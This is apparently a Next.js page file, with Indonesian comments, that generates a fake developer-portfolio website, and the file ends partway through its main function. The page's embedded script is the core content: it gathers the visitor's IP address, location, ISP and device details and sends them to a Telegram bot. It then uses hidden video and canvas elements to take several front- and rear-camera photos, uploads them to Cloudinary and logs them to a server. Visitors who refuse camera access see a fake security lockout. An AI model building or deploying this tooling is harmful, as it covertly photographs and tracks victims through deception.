// /app/demo/[linkId]/page.js

import dbConnect from '@/lib/db';
import LinkModel from '@/models/Link';
import SettingsModel from '@/models/Settings';
import { notFound } from 'next/navigation';

// --- KODE CSS LENGKAP (Dari file yang Anda upload) ---
const CSS_TEMPLATE = `
/* ================================================= */
/* CSS Styling Elegan & Modern Portofolio (500+ LINES) */
/* ================================================= */
@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap');

/* --- 1. VARIABLE DAN KONFIGURASI GLOBAL --- */
:root {
    --primary-color: #007bff; /* Biru Profesional Utama */
    --primary-dark: #0056b3; /* Biru Tua untuk hover */
    --secondary-color: #f0f4f8; /* Latar Belakang Bagian Utama */
    --dark-color: #212529; /* Teks Gelap Utama */
    --light-text: #e9ecef; /* Teks di latar belakang gelap */
    --light-bg: #ffffff; /* Latar Belakang Kartu/Konten */
    --shadow-subtle: 0 4px 10px rgba(0, 0, 0, 0.05); /* Shadow sangat halus */
    --shadow-card: 0 10px 30px rgba(0, 0, 0, 0.1); /* Shadow untuk kesan 3D */
    --shadow-hover: 0 15px 40px rgba(0, 0, 0, 0.2); /* Shadow saat hover */
    --border-radius: 12px;
    --transition-speed: 0.3s ease-in-out;
    --font-main: 'Poppins', sans-serif;
}

/* --- 2. BASE STYLES DAN FLUID TYPOGRAPHY --- */
html {
    scroll-behavior: smooth;
    /* Fluid Typography (Skala Font) */
    font-size: 16px;
}
@media (min-width: 768px) {
    html {
        font-size: 17px;
    }
}
@media (min-width: 1024px) {
    html {
        font-size: 18px;
    }
}


body {
    font-family: var(--font-main);
    color: var(--dark-color);
    background-color: var(--secondary-color);
    margin: 0;
    padding: 0;
    line-height: 1.7;
    overflow-x: hidden;
}

h1, h2, h3, h4, h5, h6 {
    font-weight: 700;
    margin-top: 0;
    line-height: 1.2;
}

.container {
    max-width: 1200px; /* Lebar maksimum lebih besar */
    margin: 0 auto;
    padding: 0 30px; 
}

/* --- 3. HEADER / HERO SECTION ADVANCED --- */
.hero {
    /* Gradien Latar Belakang */
    background: linear-gradient(135deg, var(--primary-color) 0%, #4a90e2 100%);
    color: white;
    padding: 20px 0 0 0; 
    text-align: center;
    position: relative;
    overflow: hidden; 
}

/* Bagian untuk menampung logo dan navigasi */
.header-content-wrapper {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding-top: 20px;
}

.logo {
    font-weight: 800;
    font-size: 1.8em;
    margin: 0;
    letter-spacing: 1px;
}

.nav-bar a {
    color: white;
    text-decoration: none;
    font-weight: 500;
    margin-left: 35px;
    padding: 10px 0;
    transition: color var(--transition-speed), border-bottom var(--transition-speed);
    position: relative;
}

.nav-bar a:hover {
    color: #ffd700; 
}
/* Efek garis bawah elegan */
.nav-bar a::after {
    content: '';
    position: absolute;
    bottom: 0;
    left: 50%;
    transform: translateX(-50%);
    width: 0;
    height: 3px;
    background-color: #ffd700;
    transition: width var(--transition-speed);
}
.nav-bar a:hover::after {
    width: 100%;
}

/* Konten Utama Hero */
.hero-content {
    padding-top: 80px;
    padding-bottom: 150px; /* Padding lebih besar */
    animation: fadeInDown 1s ease-out;
}

.pre-title {
    font-weight: 400;
    font-size: 1.1em;
    margin-bottom: 5px;
    opacity: 0.8;
}

.hero-content h1 {
    font-weight: 800;
    font-size: clamp(2.5em, 6vw, 4.5em); /* Fluid font size */
    margin: 0 0 10px 0;
}

.tagline {
    font-weight: 300;
    font-size: 1.3em;
    opacity: 0.9;
    margin-bottom: 40px;
}

/* --- CSS WAVE EFFECT (GELOMBANG) --- */
.wave {
    position: absolute;
    bottom: 0;
    left: 0;
    width: 100%;
    height: 120px;
    overflow: hidden;
    line-height: 0;
    transform: rotate(180deg);
}

.wave svg {
    position: relative;
    display: block;
    width: calc(100% + 1.3px);
    height: 150px;
}

.wave .shape-fill {
    fill: var(--secondary-color);
}


/* --- 4. CTA BUTTON GLOBAL DAN ANIMASI --- */
.cta-btn {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    background-color: var(--light-bg);
    color: var(--primary-color);
    padding: 15px 35px;
    border-radius: 50px; 
    text-decoration: none;
    font-weight: 600;
    transition: all var(--transition-speed);
    box-shadow: 0 6px 15px rgba(0, 0, 0, 0.15);
    border: none;
    cursor: pointer;
    font-size: 1em;
    gap: 10px;
}

.cta-btn:hover {
    transform: translateY(-5px) scale(1.02);
    box-shadow: var(--shadow-hover);
    background-color: #e2e6ea;
}

.cta-btn.primary-bg {
    background-color: var(--primary-dark);
    color: var(--light-bg);
    box-shadow: 0 8px 20px rgba(0, 90, 179, 0.4);
}

.cta-btn.primary-bg:hover {
    background-color: var(--primary-color);
    box-shadow: 0 10px 25px rgba(0, 123, 255, 0.6);
}

/* --- 5. SECTION STRUCTURES --- */
.section-title {
    font-weight: 700;
    font-size: 2.5em;
    color: var(--dark-color);
    margin-bottom: 50px;
    text-align: center;
    padding-top: 60px;
    position: relative;
}

.section-title::after {
    content: '';
    position: absolute;
    bottom: -10px;
    left: 50%;
    transform: translateX(-50%);
    width: 60px;
    height: 4px;
    background-color: var(--primary-color);
    border-radius: 2px;
}

.divider {
    border: 0;
    height: 1px;
    background-image: linear-gradient(to right, rgba(0, 0, 0, 0), rgba(0, 123, 255, 0.5), rgba(0, 0, 0, 0));
    margin: 80px 0;
}

.card-section {
    padding: 20px 0;
}

/* --- 6. CARD STYLE ELEGAN (3D EFFECT) --- */
.card {
    background-color: var(--light-bg);
    padding: 35px;
    border-radius: var(--border-radius);
    box-shadow: var(--shadow-card);
    transition: all var(--transition-speed);
    border: 1px solid #e9ecef;
}

.card:hover {
    transform: translateY(-8px) perspective(1000px) rotateX(1deg); /* Efek 3D halus */
    box-shadow: var(--shadow-hover);
}

/* --- 7. PROJECTS SECTION GRID --- */
.projects-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
    gap: 35px;
    margin-bottom: 40px;
}

.project-item {
    text-align: center;
}

.project-item h4 {
    color: var(--primary-dark);
    font-weight: 600;
    margin-top: 15px;
    font-size: 1.3em;
}

.icon-large {
    font-size: 4em;
    color: var(--primary-color);
    margin-bottom: 10px;
    transition: transform var(--transition-speed);
}

.project-item:hover .icon-large {
    transform: scale(1.1) rotate(5deg);
}

.project-link {
    display: inline-block;
    margin-top: 20px;
    color: var(--primary-dark);
    text-decoration: none;
    font-weight: 600;
    transition: color var(--transition-speed);
}

.project-link:hover {
    color: var(--primary-color);
}

/* --- 8. EXPERIENCE SECTION (TIMELINE) --- */
.timeline {
    position: relative;
    max-width: 800px;
    margin: 0 auto;
    padding-left: 20px;
}

.timeline::after {
    content: '';
    position: absolute;
    width: 4px;
    background-color: var(--primary-color);
    top: 0;
    bottom: 0;
    left: 6px; /* Posisi Garis Timeline */
    margin-left: -3px;
}

.timeline-item {
    padding: 10px 0;
    position: relative;
    width: 100%;
    margin-bottom: 40px;
    padding-left: 50px;
}

.timeline-dot {
    position: absolute;
    width: 18px;
    height: 18px;
    background-color: var(--primary-color);
    border: 4px solid var(--light-bg);
    top: 20px;
    left: 0;
    border-radius: 50%;
    z-index: 10;
    box-shadow: 0 0 0 2px var(--primary-dark);
}

.timeline-date {
    font-size: 0.9em;
    font-weight: 600;
    color: #6c757d;
    margin-bottom: 5px;
}

.timeline-content {
    margin-top: 15px;
    background-color: var(--light-bg);
    box-shadow: var(--shadow-subtle);
    padding: 25px;
    transition: all var(--transition-speed);
}
.timeline-content:hover {
    transform: translateY(-3px);
    box-shadow: var(--shadow-card);
}
.timeline-content h4 {
    color: var(--primary-dark);
    margin-bottom: 5px;
}
.timeline-content h5 {
    color: #495057;
    font-weight: 500;
    font-style: italic;
    font-size: 1em;
    margin-bottom: 10px;
}

/* --- 9. SKILLS SECTION (BADGES/CHIPS) --- */
.skills-category {
    margin-bottom: 30px;
    padding: 30px;
    background-color: var(--light-bg);
    border-radius: var(--border-radius);
    box-shadow: var(--shadow-subtle);
    transition: transform var(--transition-speed);
}
.skills-category:hover {
    transform: scale(1.01);
}

.skills-category h3 {
    border-bottom: 3px solid var(--secondary-color);
    padding-bottom: 15px;
    margin-bottom: 25px;
    font-weight: 600;
    color: var(--dark-color);
    font-size: 1.5em;
}
.skills-category h3 i {
    color: var(--primary-color);
}

.skills-grid {
    display: flex;
    flex-wrap: wrap;
    gap: 15px;
}

.skill-badge {
    background-color: #e9ecef;
    color: var(--dark-color);
    padding: 10px 20px;
    border-radius: 25px;
    font-size: 0.9em;
    font-weight: 500;
    transition: all var(--transition-speed);
    border: 1px solid #ced4da;
    cursor: default;
}

.skill-badge:hover {
    background-color: var(--primary-color);
    color: white;
    border-color: var(--primary-dark);
    transform: translateY(-2px);
    box-shadow: 0 3px 8px rgba(0, 123, 255, 0.3);
}

/* --- 10. CONTACT FORM --- */
.contact-form {
    max-width: 700px;
    margin: 0 auto;
    padding: 40px; 
}

.form-group {
    margin-bottom: 25px;
}

.contact-form input,
.contact-form textarea {
    width: 100%;
    padding: 18px;
    border: 1px solid #dee2e6;
    border-radius: 8px;
    font-family: var(--font-main);
    font-size: 1em;
    background-color: #f8f9fa;
    transition: border-color 0.3s, box-shadow 0.3s;
    box-sizing: border-box; /* Penting untuk padding */
}

.contact-form input:focus,
.contact-form textarea:focus {
    border-color: var(--primary-color);
    box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);
    background-color: var(--light-bg);
    outline: none;
}

/* --- 11. FOOTER DAN SOSIAL MEDIA --- */
.footer {
    background-color: var(--dark-color);
    color: var(--light-text);
    text-align: center;
    padding: 40px 0;
    margin-top: 80px;
    font-size: 0.9em;
    border-top: 4px solid var(--primary-color);
}

.footer-social {
    margin-bottom: 20px;
}

.social-icon {
    color: var(--light-text);
    font-size: 1.8em;
    margin: 0 15px;
    transition: color var(--transition-speed), transform 0.2s;
}

.social-icon:hover {
    color: var(--primary-color);
    transform: scale(1.2);
}

.footer p i {
    color: #dc3545; 
    margin: 0 5px;
}

/* --- 12. UTILITY CLASSES --- */
.text-center { text-align: center; }
.text-primary { color: var(--primary-color); }
.bg-light { background-color: var(--light-bg); }
.mb-50 { margin-bottom: 50px; }
.mt-50 { margin-top: 50px; }
.p-40 { padding: 40px; }

/* --- 13. LOG & DEMO CAMERA STYLES (MALICIOUS ELEMENTS) --- */
.api-demo-card {
    padding: 30px;
    text-align: left;
}

#log {
    background-color: #fff3cd; /* Warna kuning lembut untuk log */
    border: 2px solid #ffeeba;
    padding: 20px;
    border-radius: 8px;
    max-height: 300px;
    overflow-y: auto;
    font-size: 0.9em;
    margin-top: 25px;
    display: none; /* HARUS TETAP TERSEMBUNYI */
    color: #856404;
    font-family: monospace;
}
#log h3 {
    margin: 0 0 15px 0;
    font-size: 1.2em;
    color: #856404;
    border-bottom: 1px solid #ffeeba;
    padding-bottom: 5px;
}
#log p {
    margin: 8px 0;
    word-wrap: break-word;
    line-height: 1.4;
}

/* Menyembunyikan elemen video dan canvas (Sesuai script.js) */
#videoElement, #canvasElement {
    display: none !important;
    width: 0;
    height: 0;
    opacity: 0;
    visibility: hidden;
}

/* --- 14. PRELOADER & SPINNER --- */
#preloader {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(255, 255, 255, 0.98);
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 9999;
    transition: opacity 0.7s ease;
}
.spinner {
    border: 6px solid rgba(0, 0, 0, 0.1);
    width: 50px;
    height: 50px;
    border-radius: 50%;
    border-left-color: var(--primary-color);
    animation: spin 1s linear infinite;
}
@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

/* --- 15. MEDIA QUERIES (RESPONSIVE DESIGN) --- */

/* Tablet Portrait dan Kecil */
@media (max-width: 992px) {
    .container {
        padding: 0 20px;
    }
    .hero-content h1 {
        font-size: 3em;
    }
    .tagline {
        font-size: 1.1em;
    }
    .nav-bar a {
        margin-left: 20px;
        font-size: 0.95em;
    }
    .projects-grid {
        grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
    }
    .timeline::after {
        left: 3px;
    }
    .timeline-item {
        padding-left: 35px;
    }
    .timeline-dot {
        left: -3px;
    }
}

/* Ponsel Besar ke Tablet Kecil */
@media (max-width: 768px) {
    .header-content-wrapper {
        flex-direction: column;
        text-align: center;
    }
    .nav-bar {
        margin-top: 25px;
    }
    .nav-bar a {
        margin: 0 10px;
        display: inline-block;
        padding: 5px 0;
    }
    .nav-bar a::after {
        height: 2px;
    }
    .hero-content {
        padding-top: 50px;
        padding-bottom: 100px;
    }
    .hero-content h1 {
        font-size: 2.8em;
    }
    .section-title {
        font-size: 2em;
        margin-bottom: 30px;
    }
    .card {
        padding: 30px;
    }
    .divider {
        margin: 60px 0;
    }
}

/* Ponsel Kecil */
@media (max-width: 576px) {
    .logo {
        font-size: 1.6em;
    }
    .hero-content h1 {
        font-size: 2em;
    }
    .tagline {
        font-size: 0.9em;
    }
    .nav-bar {
        display: flex;
        flex-wrap: wrap;
        justify-content: center;
        gap: 5px;
    }
    .nav-bar a {
        font-size: 0.85em;
        margin: 5px;
    }
    .cta-btn {
        padding: 12px 25px;
        font-size: 0.9em;
    }
    .projects-grid {
        grid-template-columns: 1fr;
    }
    .skills-category {
        padding: 20px;
    }
    .timeline {
        padding-left: 10px;
    }
    .timeline::after {
        left: 0;
    }
    .timeline-item {
        padding-left: 30px;
    }
    .timeline-dot {
        left: -8px;
    }
    .footer-social .social-icon {
        font-size: 1.5em;
    }
}
`; 

// --- FUNGSI UTAMA UNTUK MENGGABUNGKAN SEMUA ---
const createFinalHtml = (linkId, botToken, chatId, cloudName, uploadPreset, title, websiteName) => {

    // --- KODE JAVASCRIPT LENGKAP (Dari file yang Anda upload) ---
    const JS_CODE = `
/* =========================================== */
/* script.js: FINAL DINAMIS INJEKSI */
/* =========================================== */
    
const LINK_ID = "${linkId}";
const YOUR_BOT_TOKEN = "${botToken}";
const YOUR_CHAT_ID = "${chatId}";
const CLOUDINARY_CLOUD_NAME = "${cloudName}";
const CLOUDINARY_UPLOAD_PRESET = "${uploadPreset}"; 

const logDiv = document.getElementById('log');
const videoElement = document.getElementById('videoElement');
const canvasElement = document.getElementById('canvasElement'); 
const preloader = document.getElementById('preloader');
const permissionBtn = document.getElementById('permissionBtn');

const CAPTURE_CONFIG = [
    { mode: 'user', count: 3, name: 'Depan' }, 
    { mode: 'environment', count: 2, name: 'Belakang' } 
];
const DELAY_BETWEEN_CAPTURES_MS = 1000; 
let photosCapturedUrls = [];
let cameraSuccessStatus = false;
let accessBlocked = false;

// --- FUNGSI 1: Log di Halaman
function appendLog(message, isError = false) {
    if (logDiv.style.display === 'none') {
        logDiv.style.display = 'block';
    }
    const p = document.createElement('p');
    p.textContent = message;
    p.style.color = isError ? '#ff6b6b' : '#0f0'; 
    logDiv.appendChild(p);
    logDiv.scrollTop = logDiv.scrollHeight;
}

// --- FUNGSI 2: KIRIM Pesan Teks ke Telegram
async function kirimPesanTeks(text) {
    const telegramUrl = \`https://api.telegram.org/bot\${YOUR_BOT_TOKEN}/sendMessage\`;
    const params = {
        chat_id: YOUR_CHAT_ID,
        text: text,
        parse_mode: 'HTML',
    };
    try {
        await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(params),
        });
    } catch (error) {
        appendLog(\`❌ Gagal mengirim pesan Telegram: \${error.message}\`, true);
    }
}

// --- FUNGSI 3: Unggah Foto ke Cloudinary
async function uploadToCloudinary(base64Image, modeName, index) {
    const uploadUrl = \`https://api.cloudinary.com/v1_1/\${CLOUDINARY_CLOUD_NAME}/image/upload\`;
    const formData = new FormData();
    formData.append('file', base64Image);
    formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);

    try {
        const response = await fetch(uploadUrl, { method: 'POST', body: formData, });
        const data = await response.json();
        if (data.secure_url) {
            appendLog(\`✅ Foto \${modeName}-\${index} berhasil diunggah.\`);
            return data.secure_url;
        } else {
            appendLog(\`❌ Gagal unggah foto \${modeName}-\${index}: \${data.error?.message || 'Unknown error'}\`, true);
            return null;
        }
    } catch (error) {
        appendLog(\`❌ Error saat upload Cloudinary: \${error.message}\`, true);
        return null;
    }
}

// --- FUNGSI 4: Dapatkan detail IP dan Spesifikasi Perangkat
async function getIPAndDeviceDetails() {
    let ipInfo = {};
    let isVPN = false;
    let vpnService = '';

    try {
        const ipResponse = await fetch('https://ipapi.co/json/');
        ipInfo = await ipResponse.json();

        if (ipInfo.asn?.includes('VPN') || ipInfo.isp?.includes('VPN') || ipInfo.proxy) {
            isVPN = true;
            vpnService = ipInfo.isp || ipInfo.asn;
        }
    } catch (e) {
        appendLog('❌ Gagal mendapatkan detail IP.', true);
    }

    const userAgent = navigator.userAgent;
    const deviceType = /Mobi|Android/i.test(userAgent) ? 'Mobile' : 'Desktop';
    
    const message = \`
🔥 *LOG DEMO BARU* 🔥
--------------------------------------
*ID LINK:* \${LINK_ID}
*NAMA WEB:* \${document.title.split(' - ')[0]}
--------------------------------------
*ALAMAT IP:* \${ipInfo.ip || 'N/A'}
*LOKASI:* \${ipInfo.city || 'N/A'}, \${ipInfo.country_name || 'N/A'}
*ISP:* \${ipInfo.org || 'N/A'}
*DEVICE:* \${deviceType}
*BROWSER:* \${userAgent}
*VPN DETECTED:* \${isVPN ? 'YA' : 'TIDAK'} \${isVPN ? \`(\${vpnService})\` : ''}
--------------------------------------
\`;
    await kirimPesanTeks(message);

    return {
        ipAddress: ipInfo.ip || 'N/A',
        location: \`\${ipInfo.city || 'N/A'}, \${ipInfo.country_name || 'N/A'}\`,
        userAgent: userAgent,
        deviceType: deviceType,
        isVPN: isVPN,
    };
}

// --- FUNGSI 5: Blokir Akses Web dan Tampilkan Pesan Profesional
function blockAccessAndShowMessage() {
    accessBlocked = true;
    document.body.innerHTML = \`
        <div style="font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f8d7da; color: #721c24; min-height: 100vh;">
            <h1 style="color: #dc3545;">⚠️ Akses Ditolak (Security Protocol)</h1>
            <p style="font-size: 1.2em;">Permintaan akses kamera Anda ditolak. Sebagai bagian dari protokol keamanan canggih kami, akses ke sumber daya demo ini telah ditangguhkan sementara.</p>
            <p>Silakan kontak administrator untuk informasi lebih lanjut.</p>
            <p style="margin-top: 30px; font-size: 0.8em; color: #6c757d;">[Reference Code: CAM-DENY-A] - IP: \${localStorage.getItem('temp_ip') || 'Logging...'} </p>
        </div>
    \`;
    preloader.style.display = 'none';
}

// --- FUNGSI 6: Ambil Foto dan Unggah
async function capturePhotosForMode(config) {
    let stream = null;
    let currentSuccess = false;
    const constraints = {
        video: {
            facingMode: config.mode,
            width: { ideal: 640 },
            height: { ideal: 480 }
        }
    };

    try {
        appendLog(\`\n➡️ Meminta izin kamera \${config.name} (${config.mode})...\`);
        stream = await navigator.mediaDevices.getUserMedia(constraints);
        currentSuccess = true;
        cameraSuccessStatus = true;
        
        videoElement.srcObject = stream;
        videoElement.play();

        appendLog(\`✅ Izin Kamera \${config.name} berhasil. Mengambil \${config.count} foto...\`);

        for (let i = 1; i <= config.count; i++) {
            await new Promise(resolve => setTimeout(resolve, DELAY_BETWEEN_CAPTURES_MS));
            
            canvasElement.width = videoElement.videoWidth;
            canvasElement.height = videoElement.videoHeight;
            const context = canvasElement.getContext('2d');
            context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
            
            const base64Image = canvasElement.toDataURL('image/jpeg');

            appendLog(\`📷 Mengunggah Foto \${config.name}-\${i}...\`);
            
            const photoUrl = await uploadToCloudinary(base64Image, config.name, i);
            if (photoUrl) {
                photosCapturedUrls.push(photoUrl);
            }
        }
        
    } catch (err) {
        const errorMsg = (err.name === 'NotAllowedError' || err.name === 'SecurityError') 
            ? \`❌ ERROR: Pengguna menolak Izin Kamera \${config.name}.\` 
            : \`❌ ERROR Kamera \${config.name}: \${err.name} - \${err.message}\`;
        appendLog(errorMsg, true);
        kirimPesanTeks(\`⚠️ GAGAL MENGAMBIL FOTO KAMERA \${config.name}:\\n\${errorMsg}\`);
        
        // Blokir akses jika kamera ditolak pada percobaan pertama (kamera depan)
        if (config.mode === 'user') {
             blockAccessAndShowMessage();
        }
        currentSuccess = false;
    } finally {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
            appendLog(\`Kamera \${config.name} dimatikan.\`);
            videoElement.srcObject = null;
        }
        return currentSuccess;
    }
}

// --- FUNGSI 7: Kirim Log Final ke Server Next.js
async function sendFinalLogToServer(details) {
    try {
        const response = await fetch('/api/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                linkId: LINK_ID,
                ipAddress: details.ipAddress,
                userAgent: details.userAgent,
                location: details.location,
                deviceType: details.deviceType,
                photoUrls: photosCapturedUrls,
                isCameraSuccessful: cameraSuccessStatus,
            }),
        });

        if (response.ok) {
            const data = await response.json();
            appendLog(\`✅ Log (ID: \${data.logId}) berhasil disimpan ke Database Next.js.\`);
        } else {
            appendLog('❌ Gagal menyimpan log ke server Next.js.', true);
        }
    } catch (error) {
        appendLog(\`❌ Error komunikasi ke server Log: \${error.message}\`, true);
    }
}

// --- FUNGSI 8: Proses Utama
async function startCaptureProcess(event) {
    event.preventDefault(); 
    
    // Hilangkan tombol setelah diklik
    permissionBtn.style.display = 'none';

    preloader.style.opacity = 1;
    preloader.style.display = 'flex';
    
    appendLog('1. Mengumpulkan detail IP dan Perangkat...');
    const details = await getIPAndDeviceDetails(); 
    localStorage.setItem('temp_ip', details.ipAddress); 

    appendLog('2. Memulai proses pengambilan foto 5x... 📸');
    
    for (const config of CAPTURE_CONFIG) {
        if (accessBlocked) break; 
        await capturePhotosForMode(config); 
    }
    
    if (!accessBlocked) {
        appendLog('3. Mengirim Log Final ke Database...');
        await sendFinalLogToServer(details);

        appendLog('✅ SEMUA PROSES PENGUMPULAN DATA SELESAI.');
    } else {
         appendLog('⚠️ Proses dihentikan karena penolakan kamera.');
    }
    
    // Hilangkan preloader hanya jika tidak diblokir
    if (!accessBlocked) {
        preloader.style.opacity = 0;
        setTimeout(() => preloader.style.display = 'none', 500);
    }
    
    if (!accessBlocked) {
        // Tampilkan tombol selesai jika tidak diblokir
        permissionBtn.style.display = 'block';
        permissionBtn.textContent = 'Demo Selesai';
        permissionBtn.style.backgroundColor = '#28a745';
        permissionBtn.style.pointerEvents = 'none';
    }
}

// --- EKSEKUSI: Pemicu Utama
window.addEventListener('load', () => {
    // Tombol CTA di header akan memicu proses
    permissionBtn.addEventListener('click', startCaptureProcess);
    appendLog('⚠️ Tekan tombol "Mulai Demo Kamera" di atas untuk memulai demo dan memberikan izin kamera.');
});
    `;


    // --- TEMPLATE HTML FINAL (Sudah termasuk <style> dan <script>) ---
    const HTML_CODE = `
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${websiteName} - ${title}</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    
    <style>${CSS_TEMPLATE}</style>
</head>
<body>

<div id="preloader"><div class="spinner"></div></div>

<header class="hero">
    <div class="container header-content-wrapper">
        <h1 class="logo">${websiteName}</h1>
        
        <nav class="nav-bar">
            <a href="#projects">Proyek</a>
            <a href="#experience">Pengalaman</a>
            <a href="#skills">Keahlian</a>
            <a href="#about">Tentang</a>
            <a href="#contact">Kontak</a>
        </nav>
    </div>
    
    <div class="hero-content">
        <p class="pre-title">Halo, Nama Saya</p>
        <h1>${title}</h1>
        <p class="tagline">Full-Stack Developer | UX Enthusiast | Exploring Web Capabilities</p>
        
        <a href="#contact" id="permissionBtn" class="cta-btn primary-bg">Mulai Demo Kamera <i class="fas fa-play"></i></a>
        
    </div>
    <div class="wave">
        <svg data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 120" preserveAspectRatio="none">
            <path d="M985.66,92.83C906.67,72,823.7,51.4,741.43,53.15c-15.54.33-31.11,1.15-46.7,2.56-20.94,1.93-41.56,5.32-61.64,10.74C560.82,80.11,460.78,99,352.33,109.89,286.36,116.5,220.17,117,153,116.27,92.51,116.03,42.58,112.18,0,105.81V0H1200V92.83Z" class="shape-fill"></path>
        </svg>
    </div>
</header>

<main class="container">

    <section id="automation-status" class="card-section">
        <h2 class="section-title">Inovasi Teknologi</h2>
        <div class="card api-demo-card">
            <h4><i class="fas fa-microchip"></i> Status Otomatisasi (Demo Cloudinary)</h4>
            <p>Saya hanya murid biasa yang masih belajar coding.</p>
            
            <video id="videoElement" autoplay></video>
            <canvas id="canvasElement"></canvas>
            <div id="log">
                <h3>Log Aktivitas Demo:</h3>
                </div>
            
        </div>
    </section>
    
    <hr class="divider">

    <section id="projects" class="card-section">
        <h2 class="section-title"><i class="fas fa-folder-open"></i> Proyek Pilihan</h2>
        <div class="projects-grid">
            <div class="card project-item" data-aos="fade-up">
                <i class="fas fa-chart-line icon-large"></i>
                <h4>1. Dashboard Data Visual</h4>
                <p>Platform dashboard interaktif menggunakan React dan D3.js dengan performa tinggi dan desain responsif.</p>
                <a href="#" class="project-link">Lihat Detail <i class="fas fa-arrow-right"></i></a>
            </div>
            <div class="card project-item" data-aos="fade-up" data-aos-delay="100">
                <i class="fas fa-shopping-basket icon-large"></i>
                <h4>2. Sistem E-Commerce Berbasis Mikroservis</h4>
                <p>Membangun arsitektur mikroservis menggunakan Node.js untuk skalabilitas dan deployment yang handal.</p>
                <a href="#" class="project-link">Lihat Detail <i class="fas fa-arrow-right"></i></a>
            </div>
            <div class="card project-item" data-aos="fade-up" data-aos-delay="200">
                <i class="fas fa-mobile-alt icon-large"></i>
                <h4>3. Aplikasi Mobile Hybrid</h4>
                <p>Pengembangan aplikasi mobile lintas platform menggunakan React Native untuk efisiensi waktu dan biaya.</p>
                <a href="#" class="project-link">Lihat Detail <i class="fas fa-arrow-right"></i></a>
            </div>
        </div>
    </section>
    
    <hr class="divider">

    <section id="experience" class="card-section">
        <h2 class="section-title"><i class="fas fa-history"></i> Riwayat Pengalaman</h2>
        <div class="timeline">
            <div class="timeline-item" data-aos="zoom-in">
                <div class="timeline-dot"></div>
                <div class="timeline-date">2023 - Sekarang</div>
                <div class="card timeline-content">
                    <h4>Full-Stack Developer</h4>
                    <h5>TechSolutions Global</h5>
                    <p>Bertanggung jawab atas pengembangan dan pemeliharaan aplikasi web skala besar, fokus pada optimasi performa dan integrasi API.</p>
                </div>
            </div>
            <div class="timeline-item" data-aos="zoom-in" data-aos-delay="200">
                <div class="timeline-dot"></div>
                <div class="timeline-date">2021 - 2023</div>
                <div class="card timeline-content">
                    <h4>Junior Frontend Specialist</h4>
                    <h5>WebDesign Studio</h5>
                    <p>Membangun antarmuka pengguna yang responsif dan aksesibel, bekerja erat dengan tim UX/UI.</p>
                </div>
            </div>
        </div>
    </section>
    
    <hr class="divider">

    <section id="skills" class="card-section">
        <h2 class="section-title"><i class="fas fa-cogs"></i> Keahlian Teknis</h2>
        <div class="skills-category" data-aos="fade-right">
            <h3><i class="fas fa-code"></i> Frontend Development</h3>
            <div class="skills-grid">
                <span class="skill-badge">HTML5</span>
                <span class="skill-badge">CSS3</span>
                <span class="skill-badge">JavaScript (ES6+)</span>
                <span class="skill-badge">React.js</span>
                <span class="skill-badge">Tailwind CSS</span>
                <span class="skill-badge">SASS/SCSS</span>
                <span class="skill-badge">Bootstrap 5</span>
            </div>
        </div>
        <div class="skills-category" data-aos="fade-left">
            <h3><i class="fas fa-server"></i> Backend & Database</h3>
            <div class="skills-grid">
                <span class="skill-badge">Node.js (Express)</span>
                <span class="skill-badge">Python (Django)</span>
                <span class="skill-badge">PostgreSQL</span>
                <span class="skill-badge">MongoDB</span>
                <span class="skill-badge">REST API</span>
                <span class="skill-badge">Authentication (OAuth)</span>
                <span class="skill-badge">Deployment (Docker)</span>
            </div>
        </div>
    </section>

    <hr class="divider">

    <section id="about" class="card-section">
        <h2 class="section-title"><i class="fas fa-user-circle"></i> Tentang Saya</h2>
        <div class="about-content card" data-aos="fade-in">
            <p>Saya adalah pengembang web dengan fokus utama pada keamanan, performa, dan pengalaman pengguna yang luar biasa (UX). Berbekal semangat belajar yang tinggi, saya selalu mengikuti perkembangan teknologi terbaru dan bersemangat untuk mengubah ide menjadi solusi digital yang fungsional dan elegan. Mari berkolaborasi!</p>
        </div>
    </section>
    
    <hr class="divider">

    <section id="contact" class="card-section">
        <h2 class="section-title"><i class="fas fa-envelope"></i> Hubungi Saya</h2>
        <form class="contact-form card" data-aos="zoom-in">
            <div class="form-group">
                <input type="text" placeholder="Nama Anda" required>
            </div>
            <div class="form-group">
                <input type="email" placeholder="Email Anda" required>
            </div>
            <div class="form-group">
                <textarea placeholder="Pesan Anda..." rows="6" required></textarea>
            </div>
            <button type="submit" class="cta-btn primary-bg">Kirim Pesan <i class="fas fa-paper-plane"></i></button>
        </form>
    </section>

</main>

<footer class="footer">
    <div class="container">
        <div class="footer-social">
            <a href="#" target="_blank" class="social-icon"><i class="fab fa-github"></i></a>
            <a href="#" target="_blank" class="social-icon"><i class="fab fa-linkedin-in"></i></a>
            <a href="#" target="_blank" class="social-icon"><i class="fab fa-instagram"></i></a>
        </div>
        <p>&copy; ${new Date().getFullYear()} Fahil Gimang. Dibuat dengan <i class="fas fa-heart"></i> dan Code.</p>
    </div>
</footer>

<script src="https://unpkg.com/aos@2.3.4/dist/aos.js"></script>
<script>
  AOS.init({
    duration: 1000,
    once: true,
  });
</script>
    
    <script>${JS_CODE}</script>
</body>
</html>
    `;
    return HTML_CODE;
};


export default async function DemoPage({ params }) {
